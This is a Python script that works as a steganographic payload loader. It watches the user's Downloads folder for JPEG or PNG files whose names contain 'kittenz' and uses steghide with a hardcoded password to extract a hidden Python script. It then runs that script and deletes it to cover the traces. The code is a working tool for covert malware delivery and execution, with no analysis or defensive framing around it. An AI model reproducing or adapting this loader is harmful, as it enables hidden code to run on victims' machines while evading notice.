import os
import subprocess
import time
from pathlib import Path
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

DOWNLOADS_FOLDER = Path.home() / "Downloads"
SIGNATURE = "kittenz"
STEGO_PASSWORD = "secret123"

python_path = r"C:\Python312\python.exe"
steghide_path = r"E:\steghide\steghide.exe"

def extract_payload(image_path):
    extracted_file = DOWNLOADS_FOLDER / "extracted_payload.py"
    cmd = [
        steghide_path, "extract",
        "-sf", str(image_path),
        "-p", STEGO_PASSWORD,
        "-xf", str(extracted_file)
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        print(f"[+] Payload extracted from {image_path}")
        return extracted_file
    else:
        print(f"[-] Extraction failed: {result.stderr.strip() or result.stdout.strip()}")
        return None

def execute_payload(script_path):
    try:
        print(f"[+] Executing payload: {script_path}")
        subprocess.run([python_path, str(script_path)])
    except Exception as e:
        print(f"[!] Execution failed: {e}")
    finally:
        if script_path.exists():
            os.remove(script_path)

class StegoImageHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            self.process_file(event.src_path)

    def on_moved(self, event):
        if not event.is_directory:
            self.process_file(event.dest_path)

    def process_file(self, file_path):
        filename = os.path.basename(file_path)
        if filename.lower().endswith(('.jpg', '.jpeg', '.png')) and SIGNATURE in filename.lower():
            print(f"[+] Image detected: {filename}")

            # Ensure file is fully written
            time.sleep(3)

            payload = extract_payload(file_path)
            if payload:
                execute_payload(payload)

def monitor_downloads():
    print(f"[*] Monitoring {DOWNLOADS_FOLDER} for stego images...")
    event_handler = StegoImageHandler()
    observer = Observer()
    observer.schedule(event_handler, str(DOWNLOADS_FOLDER), recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

if __name__ == "__main__":
    monitor_downloads()
